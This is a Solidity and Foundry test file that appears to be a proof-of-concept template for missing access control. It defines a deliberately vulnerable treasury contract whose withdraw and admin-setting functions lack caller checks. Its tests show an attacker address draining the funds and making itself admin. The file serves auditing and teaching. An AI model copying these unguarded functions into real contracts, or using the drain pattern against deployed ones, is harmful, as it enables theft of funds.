// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

/**
 * @title Access Control PoC Template
 * @notice Demonstrates missing/broken access control patterns
 */

// Vulnerable contract - missing access control
contract VulnerableTreasury {
    address public owner;
    mapping(address => bool) public admins;

    constructor() {
        owner = msg.sender;
        admins[msg.sender] = true;
    }

    // VULNERABLE: No access control!
    function emergencyWithdraw(address to, uint256 amount) external {
        // Missing: require(msg.sender == owner || admins[msg.sender]);
        (bool success,) = to.call{value: amount}("");
        require(success, "Transfer failed");
    }

    // VULNERABLE: Wrong modifier logic
    function setAdmin(address admin, bool status) external {
        // Missing: onlyOwner check
        admins[admin] = status;
    }

    receive() external payable {}
}

contract AccessControlPoCTest is Test {
    VulnerableTreasury treasury;

    address owner = address(0x1);
    address attacker = address(0xBAD);

    function setUp() public {
        // Deploy as owner
        vm.prank(owner);
        treasury = new VulnerableTreasury();

        // Fund treasury
        vm.deal(address(treasury), 100 ether);
    }

    function test_Exploit_MissingAccessControl() public {
        uint256 treasuryBefore = address(treasury).balance;
        uint256 attackerBefore = attacker.balance;

        console.log("=== Initial State ===");
        console.log("Treasury:", treasuryBefore / 1e18, "ETH");
        console.log("Attacker:", attackerBefore / 1e18, "ETH");

        // Attacker calls emergencyWithdraw directly
        vm.prank(attacker);
        treasury.emergencyWithdraw(attacker, 100 ether);

        uint256 treasuryAfter = address(treasury).balance;
        uint256 attackerAfter = attacker.balance;

        console.log("=== Final State ===");
        console.log("Treasury:", treasuryAfter / 1e18, "ETH");
        console.log("Attacker:", attackerAfter / 1e18, "ETH");

        // Verify complete drain
        assertEq(treasuryAfter, 0, "Treasury should be empty");
        assertEq(attackerAfter, 100 ether, "Attacker should have all funds");
    }

    function test_Exploit_PrivilegeEscalation() public {
        // Attacker grants themselves admin
        vm.prank(attacker);
        treasury.setAdmin(attacker, true);

        // Verify privilege escalation
        assertTrue(treasury.admins(attacker), "Attacker should be admin");

        console.log("Attacker is now admin:", treasury.admins(attacker));
    }

    function test_Verify_OwnerCannotBeChanged() public {
        // Verify owner is still original
        assertEq(treasury.owner(), owner, "Owner should be unchanged");

        // But attacker has admin access anyway due to missing checks
        vm.prank(attacker);
        treasury.setAdmin(attacker, true);

        assertTrue(treasury.admins(attacker), "Access control bypassed");
    }
}
